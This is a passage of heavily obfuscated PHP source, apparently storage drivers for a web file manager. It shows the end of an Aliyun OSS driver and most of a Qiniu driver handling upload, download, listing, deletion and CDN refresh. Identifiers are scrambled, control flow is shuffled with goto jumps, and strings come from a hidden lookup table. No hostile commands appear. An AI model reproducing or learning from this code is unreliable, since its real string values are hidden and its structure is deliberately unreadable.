$aø¿×¼Šˆ[1211] . rawurlencode("{$a³œÍ…¯·­}\x3b\x66\x69\154\145\x6e\x61\x6d\145\75{$C’±¢µöİ÷}")); $eÕ‰¬ô×‘[OSS\OssClient::OSS_SUB_RESOURCE] .= $aø¿×¼Šˆ[1212] . rawurlencode($aÜ“¾”ÙÀ); $Eõ±ÎöÏ´æ = $this->link($F›ùÄé¥Ùñ, $eÕ‰¬ô×‘); goto C†½ğ ¾; aóÕŒ‡†”: } public function fileOutServer($b²™õôª“¾, $C«Š‘™ï¼© = false, $bí“‹¶ÄĞî = false, $BÚ‹‡ØÅ£­ = '') { parent::fileOut($b²™õôª“¾, $C«Š‘™ï¼©, $bí“‹¶ÄĞî, $BÚ‹‡ØÅ£­); } public function fileOutImage($c˜ÈĞ¡›œƒ, $aÉæÊ–ÇÅ = 250) { $fåìÌÜÒå = array(OSS\OssClient::OSS_PROCESS => $_SERVER[”Ì÷ñ­î¸][1213] . $aÉæÊ–ÇÅ); $cºÀ¿³ ¾± = $this->link($c˜ÈĞ¡›œƒ, $fåìÌÜÒå); $this->fileOutLink($cºÀ¿³ ¾±); } public function fileOutImageServer($CãÜëÒ–õ¹, $Cß‘Ö—Êó = 250) { parent::fileOutImage($CãÜëÒ–õ¹, $Cß‘Ö—Êó); } public function fileOutLink($c¡£ÓîçÚ) { $AÕ‚öÎ­î =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->isCdnHost() && substr($c¡£ÓîçÚ, 0, 7) == $AÕ‚öÎ­î[1115]) { $c¡£ÓîçÚ = $AÕ‚öÎ­î[1116] . substr($c¡£ÓîçÚ, 7); } header($AÕ‚öÎ­î[156] . $c¡£ÓîçÚ); die; } public function hashMd5($C­Ø†Áƒ, $a¸³‹Ëã¾ğ = '') { $cà©ôŒÏÌ© =& $_SERVER[”Ì÷ñ­î¸]; $dÕê¿îÖ›– = $this->objectMeta($C­Ø†Áƒ); if (!$dÕê¿îÖ›–) { return $cà©ôŒÏÌ©[33]; } if (!isset($dÕê¿îÖ›–[$cà©ôŒÏÌ©[1186]]) && !empty($a¸³‹Ëã¾ğ)) { $dğÍ·¼Ç = $this->updateObjMeta($C­Ø†Áƒ, array($cà©ôŒÏÌ©[1186] => $a¸³‹Ëã¾ğ)); $dÕê¿îÖ›–[$cà©ôŒÏÌ©[1186]] = $dğÍ·¼Ç ? $a¸³‹Ëã¾ğ : $cà©ôŒÏÌ©[33]; } return isset($dÕê¿îÖ›–[$cà©ôŒÏÌ©[1186]]) ? strtolower($dÕê¿îÖ›–[$cà©ôŒÏÌ©[1186]]) : $cà©ôŒÏÌ©[33]; } public function size($b†â•¤“â¯) { $cÂíÄ©Š³ = $this->objectMeta($b†â•¤“â¯); return $cÂíÄ©Š³ ? $cÂíÄ©Š³[$_SERVER[”Ì÷ñ­î¸][77]] : 0; } public function info($e…ã‘°÷Ğí) { if ($this->isFolder($e…ã‘°÷Ğí)) { return $this->folderInfo($e…ã‘°÷Ğí); } else { if ($this->isFile($e…ã‘°÷Ğí)) { return $this->fileInfo($e…ã‘°÷Ğí); } } return !1; } public function exist($c ºã…­ŠÛ) { return $this->isFile($c ºã…­ŠÛ) || $this->isFolder($c ºã…­ŠÛ); } public function isFile($a”È·ŒØµç) { return !$this->isFolder($a”È·ŒØµç) && $this->objectMeta($a”È·ŒØµç); } public function isFolder($CìÈ¿Ã¦) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][223], $CìÈ¿Ã¦); } protected function objectMeta($FÜ–Şñ¹•¼) { return $this->cacheMethod($_SERVER[”Ì÷ñ­î¸][224], $FÜ–Şñ¹•¼); } protected function _objectMeta($A¾æ«çæàÁ) { $AĞï£áÏÖ =& $_SERVER[”Ì÷ñ­î¸]; try { $f©«¶«Üñé = $this->client->getObjectMeta($this->bucket, $this->pathEncode($A¾æ«çæàÁ)); } catch (OSS\Core\OssException $aâà¾Œ¼Ìç) { $f©«¶«Üñé = !1; } if ($f©«¶«Üñé) { $f©«¶«Üñé[$AĞï£áÏÖ[77]] = intval($f©«¶«Üñé[$AĞï£áÏÖ[1193]]); } return $f©«¶«Üñé; } protected function _isFolder($E‹¿ôÛµ±) { $fó‚ÀÏ„Ïƒ =& $_SERVER[”Ì÷ñ­î¸]; if ($E‹¿ôÛµ± == $fó‚ÀÏ„Ïƒ[33] || $E‹¿ôÛµ± == $fó‚ÀÏ„Ïƒ[8]) { return !0; } $eÂäÇÎ¸‰ = array($fó‚ÀÏ„Ïƒ[1183] => $fó‚ÀÏ„Ïƒ[8], $fó‚ÀÏ„Ïƒ[186] => rtrim($E‹¿ôÛµ±, $fó‚ÀÏ„Ïƒ[8]) . $fó‚ÀÏ„Ïƒ[8], $fó‚ÀÏ„Ïƒ[1184] => 1, $fó‚ÀÏ„Ïƒ[1185] => $fó‚ÀÏ„Ïƒ[33]); $Dé®™³ÃİÂ = $this->client->listObjects($this->bucket, $eÂäÇÎ¸‰); if ($Dé®™³ÃİÂ->getObjectList() || $Dé®™³ÃİÂ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($A¬½¦‘é¸ƒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[”Ì÷ñ­î¸][1214]; $this->_init($A¬½¦‘é¸ƒ); } public function _init($A†À©É’Ú) { foreach ($A†À©É’Ú as $dÂ¡×ÏÅ³¨ => $C»¡Úí”£ä) { if (isset($this->{$dÂ¡×ÏÅ³¨})) { $this->{$dÂ¡×ÏÅ³¨} = $C»¡Úí”£ä; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[”Ì÷ñ­î¸][1215], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Fõ„¼•“Ê™, $a¢™Œù˜“ = '', $FÕ¥Ú™¹Ú = REPEAT_RENAME) { if ($this->setContent($Fõ„¼•“Ê™, $a¢™Œù˜“)) { return $this->getPathOuter($Fõ„¼•“Ê™); } return !1; } public function mkdir($d¬…ù‰Øğ, $Câ¾Ëî×Åî = REPEAT_SKIP) { goto Eƒ¿Ÿ¸ëä¬; fô˜›Ş¯ÌÁ: $d¬…ù‰Øğ = $C˜ÉĞÏêÏ¹ . $eƒÔŞ´½“Í[8]; $fôÃİÛÀÃ¨ = get_path_this($C˜ÉĞÏêÏ¹); $a‹‡†×òª = $d¬…ù‰Øğ . $fôÃİÛÀÃ¨; goto FÎ«Œ–³âÏ; FÎ«Œ–³âÏ: if (!$this->mkfile($a‹‡†×òª)) { return !1; } if (!$this->moveFile($a‹‡†×òª, $d¬…ù‰Øğ)) { $this->delFile($a‹‡†×òª); return !1; } return $this->getPathOuter($C˜ÉĞÏêÏ¹); goto e«ºÌ°¨“; Eƒ¿Ÿ¸ëä¬: $eƒÔŞ´½“Í =& $_SERVER[”Ì÷ñ­î¸]; $C˜ÉĞÏêÏ¹ = trim($d¬…ù‰Øğ, $eƒÔŞ´½“Í[8]); if ($this->_isFolder($C˜ÉĞÏêÏ¹)) { return $this->getPathOuter($C˜ÉĞÏêÏ¹); } goto fô˜›Ş¯ÌÁ; e«ºÌ°¨“: } public function copyFile($c‚¼£ñéò, $B¬ÖÓŞ¯‘é) { $e†¢ïŠêª’ = $this->bucketManager->copy($this->bucket, $c‚¼£ñéò, $this->bucket, $B¬ÖÓŞ¯‘é, !0); return $e†¢ïŠêª’ ? !1 : !0; } public function moveFile($f¤š¦Â‹£, $d¸Ó†‰‡…ñ) { $Eå‘è†‰í = $this->bucketManager->move($this->bucket, $f¤š¦Â‹£, $this->bucket, $d¸Ó†‰‡…ñ, !0); return $Eå‘è†‰í ? !1 : !0; } public function delFile($CÇ—ŸÇÄŒ˜) { $aø´·¢ƒ« = $this->bucketManager->delete($this->bucket, $CÇ—ŸÇÄŒ˜); return $aø´·¢ƒ« ? !1 : !0; } public function delFolder($cÃøš‘ÚÉ¿) { $BÈÃÆ‡´¹Î = $this->fileList($cÃøš‘ÚÉ¿); if (empty($BÈÃÆ‡´¹Î)) { return !0; } $Dô·‡´¯Â = 1000; if (count($BÈÃÆ‡´¹Î) <= $Dô·‡´¯Â) { return $this->qnDelObj($BÈÃÆ‡´¹Î) ? !1 : !0; } foreach (array_chunk($BÈÃÆ‡´¹Î, $Dô·‡´¯Â) as $eªÊŒùŸ†£) { $eˆöëáÆ‰– = $this->qnDelObj($eªÊŒùŸ†£); if ($eˆöëáÆ‰–) { return !1; } } return !0; } private function qnDelObj($dÌ÷½ÄŸ™) { $d¾Ò˜ìÅÏÀ = $this->bucketManager->buildBatchDelete($this->bucket, $dÌ÷½ÄŸ™); list($A·ˆõ–·‰, $Cñˆ‚«¸¸Œ) = $this->bucketManager->batch($d¾Ò˜ìÅÏÀ); return $Cñˆ‚«¸¸Œ; } private function fileList($d²˜Î¡ƒèß, $EÂ—Ä—çœ = 0) { goto e±ÂÉ¸·£Ç; e±ÂÉ¸·£Ç: $EğÍ¥ğÂ³õ =& $_SERVER[”Ì÷ñ­î¸]; $d²˜Î¡ƒèß = trim($d²˜Î¡ƒèß, $EğÍ¥ğÂ³õ[8]); $BåÎ“Ú¨êÈ = empty($d²˜Î¡ƒèß) ? $EğÍ¥ğÂ³õ[33] : $d²˜Î¡ƒèß . $EğÍ¥ğÂ³õ[8]; goto eïÓ£˜‡±; B‚›µè±³Ï: $CŸ†š¢ì‚Ü = array(); while (!0) { list($b¶Ê½˜‡ , $C‘¯µ„Èá) = $this->bucketManager->listFiles($this->bucket, $BåÎ“Ú¨êÈ, $cËˆòÕ•š¡, $aœòÊÅ÷¤Š, $eŠ¤ËÔ–Ğò); if ($C‘¯µ„Èá) { return !1; } $cËˆòÕ•š¡ = array_key_exists($EğÍ¥ğÂ³õ[1185], $b¶Ê½˜‡ ) ? $cËˆòÕ•š¡ = $b¶Ê½˜‡ [$EğÍ¥ğÂ³õ[1216]] : $EğÍ¥ğÂ³õ[33]; foreach ($b¶Ê½˜‡ [$EğÍ¥ğÂ³õ[1217]] as $FÑƒ´˜¹µ) { $DÂÔéÏ°Ë¾ = $FÑƒ´˜¹µ[$EğÍ¥ğÂ³õ[89]]; if ($EÂ—Ä—çœ) { $DÂÔéÏ°Ë¾ = array($EğÍ¥ğÂ³õ[28] => $DÂÔéÏ°Ë¾, $EğÍ¥ğÂ³õ[77] => $FÑƒ´˜¹µ[$EğÍ¥ğÂ³õ[1218]]); } $CŸ†š¢ì‚Ü[] = $DÂÔéÏ°Ë¾; } if ($cËˆòÕ•š¡ == $EğÍ¥ğÂ³õ[33]) { break; } } return $CŸ†š¢ì‚Ü; goto Bˆæ“•°Š; eïÓ£˜‡±: $cËˆòÕ•š¡ = $EğÍ¥ğÂ³õ[33]; $aœòÊÅ÷¤Š = 1000; $eŠ¤ËÔ–Ğò = $EğÍ¥ğÂ³õ[33]; goto B‚›µè±³Ï; Bˆæ“•°Š: } public function rename($fƒÇ‚ñãªì, $Fƒêë„¸¹) { return $this->renameObject($fƒÇ‚ñãªì, $Fƒêë„¸¹); } public function fileInfo($f£Á¸£Ş‡, $AÙˆ°‡¤Ú³ = false, $fä¸ÆóÀğ = array()) { goto D–ò»²ÎğÖ; CÑõçª—¿¼: if (empty($fä¸ÆóÀğ)) { $fä¸ÆóÀğ = $this->objectMeta($f£Á¸£Ş‡); if (!$fä¸ÆóÀğ) { return $aÉÏÎ°½; } } if (isset($fä¸ÆóÀğ[$DÖ£ÎŠÏƒ”[1219]])) { $aÉÏÎ°½[$DÖ£ÎŠÏƒ”[187]] = $fä¸ÆóÀğ[$DÖ£ÎŠÏƒ”[1219]]; } if (isset($fä¸ÆóÀğ[$DÖ£ÎŠÏƒ”[1218]])) { $aÉÏÎ°½[$DÖ£ÎŠÏƒ”[77]] = $fä¸ÆóÀğ[$DÖ£ÎŠÏƒ”[1218]]; } goto Bá»³©ÍÆ­; D–ò»²ÎğÖ: $DÖ£ÎŠÏƒ” =& $_SERVER[”Ì÷ñ­î¸]; if ($AÙˆ°‡¤Ú³) { return array($DÖ£ÎŠÏƒ”[28] => $this->pathThis($f£Á¸£Ş‡), $DÖ£ÎŠÏƒ”[75] => $this->getPathOuter($DÖ£ÎŠÏƒ”[8] . $f£Á¸£Ş‡), $DÖ£ÎŠÏƒ”[29] => $DÖ£ÎŠÏƒ”[167], $DÖ£ÎŠÏƒ”[77] => isset($fä¸ÆóÀğ[$DÖ£ÎŠÏƒ”[1218]]) ? $fä¸ÆóÀğ[$DÖ£ÎŠÏƒ”[1218]] : 0, $DÖ£ÎŠÏƒ”[160] => $this->ext($f£Á¸£Ş‡)); } $aÉÏÎ°½ = array($DÖ£ÎŠÏƒ”[28] => $this->pathThis($f£Á¸£Ş‡), $DÖ£ÎŠÏƒ”[75] => $this->getPathOuter($DÖ£ÎŠÏƒ”[8] . $f£Á¸£Ş‡), $DÖ£ÎŠÏƒ”[29] => $DÖ£ÎŠÏƒ”[167], $DÖ£ÎŠÏƒ”[187] => 0, $DÖ£ÎŠÏƒ”[107] => 0, $DÖ£ÎŠÏƒ”[77] => 0, $DÖ£ÎŠÏƒ”[160] => $this->ext($f£Á¸£Ş‡), $DÖ£ÎŠÏƒ”[188] => !0, $DÖ£ÎŠÏƒ”[189] => !0); goto CÑõçª—¿¼; Bá»³©ÍÆ­: return $aÉÏÎ°½; goto aíãàõÄ“; aíãàõÄ“: } public function folderInfo($b‚é‘£ÒÁñ, $bÉë‹¿³ôÊ = false) { goto Aä¢×¶…ŸÃ; Aä¢×¶…ŸÃ: $A—ù¬á¯ à =& $_SERVER[”Ì÷ñ­î¸]; if ($bÉë‹¿³ôÊ) { return array($A—ù¬á¯ à[28] => $this->pathThis($b‚é‘£ÒÁñ), $A—ù¬á¯ à[75] => $this->getPathOuter($A—ù¬á¯ à[8] . $b‚é‘£ÒÁñ), $A—ù¬á¯ à[29] => $A—ù¬á¯ à[76]); } $AŠ¦ò¢ÇŞª = array($A—ù¬á¯ à[28] => $this->pathThis($b‚é‘£ÒÁñ), $A—ù¬á¯ à[75] => $this->getPathOuter($A—ù¬á¯ à[8] . $b‚é‘£ÒÁñ), $A—ù¬á¯ à[29] => $A—ù¬á¯ à[76], $A—ù¬á¯ à[187] => 0, $A—ù¬á¯ à[107] => 0, $A—ù¬á¯ à[1164] => !0, $A—ù¬á¯ à[1165] => !0); goto Dª½Ûß©; A¿öìÒàŠ: return $AŠ¦ò¢ÇŞª; goto b×´©ÏÑ®; Dª½Ûß©: $b‚é‘£ÒÁñ = rtrim($b‚é‘£ÒÁñ, $A—ù¬á¯ à[8]) . $A—ù¬á¯ à[8]; $DÑ¥¶ó‡Î = $this->objectMeta($b‚é‘£ÒÁñ); if (isset($DÑ¥¶ó‡Î[$A—ù¬á¯ à[1219]])) { $AŠ¦ò¢ÇŞª[$A—ù¬á¯ à[187]] = $DÑ¥¶ó‡Î[$A—ù¬á¯ à[1219]]; } goto A¿öìÒàŠ; b×´©ÏÑ®: } public function listPath($DÕ•›¢ÖÙ¿, $eâÈñÚÅá£ = false) { goto B¯œæï«“¤; B¯œæï«“¤: $D…ó¯—©ÅÑ =& $_SERVER[”Ì÷ñ­î¸]; $DÕ•›¢ÖÙ¿ = trim($DÕ•›¢ÖÙ¿, $D…ó¯—©ÅÑ[8]); $f¶……óÉõ = empty($DÕ•›¢ÖÙ¿) ? $D…ó¯—©ÅÑ[33] : $DÕ•›¢ÖÙ¿ . $D…ó¯—©ÅÑ[8]; goto D‚ö…œæ…; D‚ö…œæ…: $fÓñ”Æ”ˆÈ = $D…ó¯—©ÅÑ[33]; $Eï¦¿Ô™ = 1000; $Aøß ÊÂËà = $D…ó¯—©ÅÑ[8]; goto d²‚•‘³™; d²‚•‘³™: $E‚ÑÂÓêù = $bƒ½ö±•î’ = array(); while (!0) { list($dº¬ãŞÒŠ, $F±ÔÎ‚ˆÃ’) = $this->bucketManager->listFiles($this->bucket, $f¶……óÉõ, $fÓñ”Æ”ˆÈ, $Eï¦¿Ô™, $Aøß ÊÂËà); if ($F±ÔÎ‚ˆÃ’) { return !1; } $fÓñ”Æ”ˆÈ = array_key_exists($D…ó¯—©ÅÑ[1185], $dº¬ãŞÒŠ) ? $fÓñ”Æ”ˆÈ = $dº¬ãŞÒŠ[$D…ó¯—©ÅÑ[1216]] : $D…ó¯—©ÅÑ[33]; if (isset($dº¬ãŞÒŠ[$D…ó¯—©ÅÑ[1220]])) { foreach ($dº¬ãŞÒŠ[$D…ó¯—©ÅÑ[1220]] as $b›£’¤ÔšÌ) { if ($b›£’¤ÔšÌ == $f¶……óÉõ) { continue; } $E‚ÑÂÓêù[] = $this->folderInfo($b›£’¤ÔšÌ, $eâÈñÚÅá£); } } if (isset($dº¬ãŞÒŠ[$D…ó¯—©ÅÑ[1217]])) { foreach ($dº¬ãŞÒŠ[$D…ó¯—©ÅÑ[1217]] as $A´ºİ…Õ) { if ($A´ºİ…Õ[$D…ó¯—©ÅÑ[89]] == $f¶……óÉõ) { continue; } $bƒ½ö±•î’[] = $this->fileInfo($A´ºİ…Õ[$D…ó¯—©ÅÑ[89]], $eâÈñÚÅá£, $A´ºİ…Õ); } } if ($fÓñ”Æ”ˆÈ == $D…ó¯—©ÅÑ[33]) { break; } } return array($D…ó¯—©ÅÑ[74] => $E‚ÑÂÓêù, $D…ó¯—©ÅÑ[73] => $bƒ½ö±•î’); goto fœµâ”£˜È; fœµâ”£˜È: } public function has($b¨Õ¹ÇµÀƒ, $c‹‹î˜àÀä = false, $EÕ´ê†å = true) { goto bÎÄ…ƒõİ; dª§¢“½ª: if ($c‹‹î˜àÀä) { return array($aŠ½ŠÉœÀ‘[191] => $d™Òš×®ñ, $aŠ½ŠÉœÀ‘[192] => $EµÒ ¤ŞŸ¯); } return !1; goto Eê×ó÷ ë—; A×„š¨®¹“: $d™Òš×®ñ = 0; $EµÒ ¤ŞŸ¯ = 0; while (!0) { list($bÛá…š¿ô, $e¦ÌÌ¼) = $this->bucketManager->listFiles($this->bucket, $fĞÙÖÌ‰¶, $B’Öº¨Š¼‚, $C„Æë¨©½, $aÏÏìº©‘–); if ($e¦ÌÌ¼) { return !1; } $B’Öº¨Š¼‚ = array_key_exists($aŠ½ŠÉœÀ‘[1185], $bÛá…š¿ô) ? $B’Öº¨Š¼‚ = $bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1216]] : $aŠ½ŠÉœÀ‘[33]; if ($c‹‹î˜àÀä) { if (!empty($bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1217]])) { $d™Òš×®ñ += count($bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1217]]); } if (!empty($bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1220]])) { $EµÒ ¤ŞŸ¯ += count($bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1220]]); } if ($B’Öº¨Š¼‚ === $aŠ½ŠÉœÀ‘[33]) { break; } continue; } if ($EÕ´ê†å) { if (!empty($bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1217]])) { return !0; } } else { if (!empty($bÛá…š¿ô[$aŠ½ŠÉœÀ‘[1220]])) { return !0; } } if ($B’Öº¨Š¼‚ == $aŠ½ŠÉœÀ‘[33]) { break; } } goto dª§¢“½ª; AŞ„§ˆÌìÑ: $B’Öº¨Š¼‚ = $aŠ½ŠÉœÀ‘[33]; $C„Æë¨©½ = 1000; $aÏÏìº©‘– = $aŠ½ŠÉœÀ‘[8]; goto A×„š¨®¹“; bÎÄ…ƒõİ: $aŠ½ŠÉœÀ‘ =& $_SERVER[”Ì÷ñ­î¸]; $b¨Õ¹ÇµÀƒ = trim($b¨Õ¹ÇµÀƒ, $aŠ½ŠÉœÀ‘[8]); $fĞÙÖÌ‰¶ = empty($b¨Õ¹ÇµÀƒ) ? $aŠ½ŠÉœÀ‘[33] : $b¨Õ¹ÇµÀƒ . $aŠ½ŠÉœÀ‘[8]; goto AŞ„§ˆÌìÑ; Eê×ó÷ ë—: } public function listAll($AÁ¨¾ê¬¯‚) { $eŠ‚±ôóì =& $_SERVER[”Ì÷ñ­î¸]; $C•÷“Ã¿ğİ = $this->fileList($AÁ¨¾ê¬¯‚, 1); $e…†¬ë†®Ğ = array(); foreach ($C•÷“Ã¿ğİ as $aÅõ®¹•øÏ) { $e…†¬ë†®Ğ[$aÅõ®¹•øÏ[$eŠ‚±ôóì[28]]] = $aÅõ®¹•øÏ[$eŠ‚±ôóì[77]]; } return $this->listAllFiles($AÁ¨¾ê¬¯‚, array_keys($e…†¬ë†®Ğ), $e…†¬ë†®Ğ); } public function canRead($eÏ¿¢ÆÍ˜Ö) { return $this->exist($eÏ¿¢ÆÍ˜Ö) ? !0 : !1; } public function canWrite($F¶µªÇÑ¹£) { return $this->exist($F¶µªÇÑ¹£) ? !0 : !1; } public function getContent($Cå‰Ñ¾Î•) { return $this->fileSubstr($Cå‰Ñ¾Î•, 0, -1); } public function setContent($aÍ…¤ŒÜ±¾, $A‰øÇÚ¸Œ = '') { $Bù…±ñå§° = $this->tempFile($this->pathThis($aÍ…¤ŒÜ±¾)); file_put_contents($Bù…±ñå§°, $A‰øÇÚ¸Œ); if ($this->upload($aÍ…¤ŒÜ±¾, $Bù…±ñå§°)) { $this->tempFileRemve($Bù…±ñå§°); return !0; } return !1; } public function refreshUrls($B®Óí©Á¢Ê) { goto eµ¦ßÄ¡é‚; E¦®ºÉ“¼Ñ: return $C¸ƒÀôº´±[$D©„Šê™†[1221]] == $D©„Šê™†[697] ? !0 : !1; goto DÈ­œãñ‘‹; D×Ú¿‹±šÈ: $cŞŒÒ……º– = new Qiniu\Cdn\CdnManager($this->auth); list($C¸ƒÀôº´±, $AÏ¦Ô·ïîò) = $cŞŒÒ……º–->refreshUrls($d’å—‰¸§Ş); if ($AÏ¦Ô·ïîò) { return !1; } goto E¦®ºÉ“¼Ñ; eµ¦ßÄ¡é‚: $D©„Šê™† =& $_SERVER[”Ì÷ñ­î¸]; $d’å—‰¸§Ş = array(); if (is_array($B®Óí©Á¢Ê)) { foreach ($B®Óí©Á¢Ê as $FÛñ°ùäíµ) { $d’å—‰¸§Ş[] = $this->link($FÛñ°ùäíµ); } } else { $d’å—‰¸§Ş[] = $this->link($B®Óí©Á¢Ê); } goto D×Ú¿‹±šÈ; DÈ­œãñ‘‹: } public function fileSubstr($DÚ·¿Ää±ª, $dóóÑÁœ÷¯, $F®­†ˆÇŞÏ) { $BÍ­ğÕ‘‘ =& $_SERVER[”Ì÷ñ­î¸]; if (!($F­·¸ò‰Ç¶ = $this->link($DÚ·¿Ää±ª))) { return !1; } $bÂÁ–Š²Š = !1; if ($F®­†ˆÇŞÏ > 0) { $FËÅĞ£µ© = $dóóÑÁœ÷¯ + $F®­†ˆÇŞÏ - 1; $bÂÁ–Š²Š = array($BÍ­ğÕ‘‘[1222] . $dóóÑÁœ÷¯ . $BÍ­ğÕ‘‘[412] . $FËÅĞ£µ©); } $c³‘¡¦ÚÖà = url_request($F­·¸ò‰Ç¶, $BÍ­ğÕ‘‘[216], !1, $bÂÁ–Š²Š); return $c³‘¡¦ÚÖà[$BÍ­ğÕ‘‘[690]] ? $c³‘¡¦ÚÖà[$BÍ­ğÕ‘‘[1034]] : !1; } public function upload($f®´Á‡“’Ò, $fã±ï‡³°Ä, $AÇÏˆ½›Ş¸ = false, $FÈ¿Ÿ¸Ã³Ğ = REPEAT_REPLACE) { $F°×¥¡†•Î = new Qiniu\Storage\UploadManager(); $eğ»¿å« = $this->auth->uploadToken($this->bucket, $f®´Á‡“’Ò); $dÛ†ˆ†ñ = get_file_mime(get_path_ext($fã±ï‡³°Ä)); list($C‰»‡æÖĞª, $EšÃÊ¥Ë‹¨) = $F°×¥¡†•Î->putFile($eğ»¿å«, $f®´Á‡“’Ò, $fã±ï‡³°Ä, null, $dÛ†ˆ†ñ); return $EšÃÊ¥Ë‹¨ ? !1 : $this->getPathOuter($f®´Á‡“’Ò); } public function uploadFormData($A¸¢ì†Ğ‡, $DÁîŒÜÛÅÕ = 3600) { return $this->uploadToken($A¸¢ì†Ğ‡, $DÁîŒÜÛÅÕ); } public function multiUploadFormData($bÂÏÚªîÏ½, $F“’²È·İ  = 3600) { return $this->uploadToken($bÂÏÚªîÏ½, $F“’²È·İ ); } private function uploadToken($c¥õÏÜ¤“, $FÍšíæÈß = 3600) { goto eøÑî ĞÓ; eøÑî ĞÓ: $FÏø“µä¢ê =& $_SERVER[”Ì÷ñ­î¸]; $eù¢¬ÏòÌ = $FÍšíæÈß; $DÓ¾†È¼¾Û = array($FÏø“µä¢ê[1223] => $FÏø“µä¢ê[1224]); goto b¬İ‰µî®†; céºö„‡: $fí çêÂÎ = http_type() . "\x3a\x2f\x2f\165\x70\154\x6f\141\x64{$E¸‰Íçï×è}\x2e\x71\x69\156\151\165\x70\56\143\157\x6d\x2f"; return array($FÏø“µä¢ê[1226] => $D±‚ĞœãÆ˜, $FÏø“µä¢ê[1227] => $fí çêÂÎ); goto AİÆ¾Ó½µ¿; b¬İ‰µî®†: $eÜÓİªÊµ = null; $D±‚ĞœãÆ˜ = $this->auth->uploadToken($this->bucket, $eÜÓİªÊµ, $eù¢¬ÏòÌ, $DÓ¾†È¼¾Û, !0); $E¸‰Íçï×è = empty($this->region) || $this->region == $FÏø“µä¢ê[1225] ? $FÏø“µä¢ê[33] : $FÏø“µä¢ê[412] . $this->region; goto céºö„‡; AİÆ¾Ó½µ¿: } public function download($A…Â†¯ÂÁ, $f‘­«°Á¿ê) { goto Dß³öùö…; dÄÃ‡Ò–§ô: fclose($dˆ˜Î´’ôÂ); return $f‘­«°Á¿ê; goto CÁ®Äƒà; b‚Õ¢¾—Æ: $Cò÷»ŒºÙâ = 1024 * 200; $dˆ˜Î´’ôÂ = fopen($EÈÊÜå‹ñ², $_SERVER[”Ì÷ñ­î¸][1228]); while (!0) { $dî˜á”Ÿğ¢ = $this->fileSubstr($A…Â†¯ÂÁ, $e½ºÀ¿ÓÄ…, $Cò÷»ŒºÙâ); if ($dî˜á”Ÿğ¢ === !1) { return !1; } fwrite($dˆ˜Î´’ôÂ, $dî˜á”Ÿğ¢); $e½ºÀ¿ÓÄ… += $Cò÷»ŒºÙâ; if (strlen($dî˜á”Ÿğ¢) < $Cò÷»ŒºÙâ) { break; } } goto dÄÃ‡Ò–§ô; Dß³öùö…: $EÈÊÜå‹ñ² = IO::getPathInner(IO::mkfile($f‘­«°Á¿ê)); if (!($DÇç¢Ó£·÷ = $this->link($A…Â†¯ÂÁ))) { return !1; } $e½ºÀ¿ÓÄ… = 0; goto b‚Õ¢¾—Æ; CÁ®Äƒà: } public function link($D³²³È²½š, $DùÜå’ÕÙ‡ = '') { if (!$this->isFile($D³²³È²½š)) { return !1; } $C³¢«œ‰£Ò = $this->getHost() . $_SERVER[”Ì÷ñ­î¸][8] . $this->pathEncode($D³²³È²½š) . $DùÜå’ÕÙ‡; return $this->auth->privateDownloadUrl($C³¢«œ‰£Ò, 3600 * 12); } public function fileOut($AéÒâ¯ï, $bÎµœÑÈ‰ = false, $BÅïºÓ¸„ = false, $BùÅ öŒ¶¤ = '') { $c™¨Ÿ§™¡ =& $_SERVER[”Ì÷ñ­î¸]; if (!$BÅïºÓ¸„) { $BÅïºÓ¸„ = $this->pathThis($AéÒâ¯ï); } $cÑ¹œÁ…À© = $bÎµœÑÈ‰ ? $c™¨Ÿ§™¡[1229] . rawurlencode($BÅïºÓ¸„) : $c™¨Ÿ§™¡[33]; $eÙ¼î·Ä×– = $this->link($AéÒâ¯ï, $cÑ¹œÁ…À©); $this->fileOutLink($eÙ¼î·Ä×–); } public function fileOutServer($A»æ‚‡Ü, $c±Ìˆ­¶éù = false, $eÅ²™ÄÕÓ = false, $E…¶çâÚ = '') { parent::fileOut($A»æ‚‡Ü, $c±Ìˆ­¶éù, $eÅ²™ÄÕÓ, $E…¶çâÚ); } public function fileOutImage($aæÚ¹ÚêèÍ, $D½­°‚èÌ = 250) { $aëœ×Ë±ó = $this->link($aæÚ¹ÚêèÍ, $_SERVER[”Ì÷ñ­î¸][1230] . $D½­°‚èÌ); $this->fileOutLink($aëœ×Ë±ó); } public function fileOutImageServer($f®Œè¢Ş, $c¼«âé‡Ä = 250) { parent::fileOutImage($f®Œè¢Ş, $c¼«âé‡Ä); } public function hashMd5($DÏÕò‚š½÷) { $E±Ş¸‚È–Å =& $_SERVER[”Ì÷ñ­î¸]; $eÖòÖŞæçÙ = $this->objectMeta($DÏÕò‚š½÷); return isset($eÖòÖŞæçÙ[$E±Ş¸‚È–Å[196]]) ? $eÖòÖŞæçÙ[$E±Ş¸‚È–Å[196]] : !1; $BÒÇ¿ù‹µŞ = $this->link($DÏÕò‚š½÷, $E±Ş¸‚È–Å[1231]); } public function size($AáÎ¨Âã) { $F²ÀÅ‰°×« = $this->objectMeta($AáÎ¨Âã); return $F²ÀÅ‰°×« ? $F²ÀÅ‰°×«[$_SERVER[”Ì÷ñ­î¸][77]] : 0; } public function info($a¬êÅî©§î) { if ($this->isFolder($a¬êÅî©§î)) { return $this->folderInfo($a¬êÅî©§î); } else { if ($this->isFile($a¬êÅî©§î)) { return $this->fileInfo($a¬êÅî©§î); } } return !1; } public function exist($aĞ«©’ãˆ) { return $this->isFile($aĞ«©’ãˆ) || $this->isFolder($aĞ«©’ãˆ); } public function 